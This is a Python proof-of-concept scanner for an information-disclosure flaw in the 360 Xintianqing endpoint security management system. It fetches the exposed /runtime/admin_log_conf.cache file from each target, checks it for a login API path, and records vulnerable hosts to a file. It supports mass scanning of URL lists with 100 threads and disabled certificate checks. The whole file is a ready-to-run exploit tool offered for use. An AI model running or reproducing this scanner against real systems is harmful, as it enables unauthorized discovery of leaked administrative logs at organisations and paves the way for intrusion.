import requests,sys,argparse,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """
    ____________________________________________________________________________
        _                         _   _                 __
        /                         /  /|               /    )             /
    ---/--------------__----__---/| /-|----__--------/---------__----__-/----__-
      /      /   /  /   ) /   ) / |/  |  /   )      /        /   ) /   /   /___)
    _/____/_(___(__(___(_/___/_/__/___|_(___(______(____/___(___/_(___/___(___ _
                                             ------
                                                    anthor:luanma                                                    
    """
    print(test)

def poc(target):
    url = target + '/runtime/admin_log_conf.cache'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)"
    }
    try:
        res1 = requests.get(url=url, headers=headers, verify=False,timeout=5)
        if '/api/node/login' in res1.text:
            print(f"[+]{target}存在信息泄露漏洞")
            with open("output.txt",'a',encoding='utf-8') as f:
                f.write(target + "\n")
        else:
            print(f"[-]{target}不存在信息泄露漏洞")
    except Exception as e:
        print(f"[-]{target}有问题")

#存在漏洞的url最后会导出在output.txt文件中



def main():
    banner()
    url_list = []
    parser = argparse.ArgumentParser(description="这是360新天擎终端安全管理系统信息泄露漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='请输入你的url')
    parser.add_argument('-f','--file',dest='file',type=str,help='请输入一个存有url的txt文件')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage: python {sys.argv[0]} -h or --help for help")


if __name__ == '__main__':
    main()